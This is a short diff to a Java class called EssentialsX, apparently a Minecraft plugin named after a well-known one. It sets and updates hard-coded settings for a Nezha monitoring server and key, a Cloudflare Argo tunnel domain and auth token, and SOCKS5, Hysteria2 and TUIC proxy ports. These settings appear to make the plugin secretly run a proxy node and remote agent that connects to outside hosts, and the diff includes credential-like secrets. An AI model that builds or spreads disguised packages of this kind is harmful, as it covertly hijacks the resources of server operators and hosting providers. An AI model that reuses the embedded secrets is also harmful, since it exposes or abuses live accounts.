@@ -182,14 +182,14 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private void applyDefaultEnv(Map<String, String> env) {
-        env.put("UUID", "3873ba8f-4a36-42f3-8200-b3a9d47ac139");
+        env.put("UUID", "8e4745c9-c244-4136-8c42-fac431fc3154");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "altare-sg.tieniu.dpdns.org");
-        env.put("ARGO_AUTH", "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiODI1Y2Q1OWUtYzU2Mi00ODMyLWE2MzYtOTcwNjNkMjgxNDcxIiwicyI6Ik5EQmtNV1V5TVRJdFlqZGhOQzAwWVdFNUxXRTFPRE10T0RKaU1qRmtZMkk1WldJdyJ9");
+        env.put("ARGO_DOMAIN", "altare-sg2.svip9.de5.net");
+        env.put("ARGO_AUTH", "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiOTYzZTM0ZjItYmZkYS00OGEwLWFkZjYtOGNmNTUxYTExZTBkIiwicyI6Ik9UQmlaRFJrTkRFdFpqVXdNaTAwWkdNekxUaG1OVGd0TkdZeVltRXdZbUUwWVdFMSJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
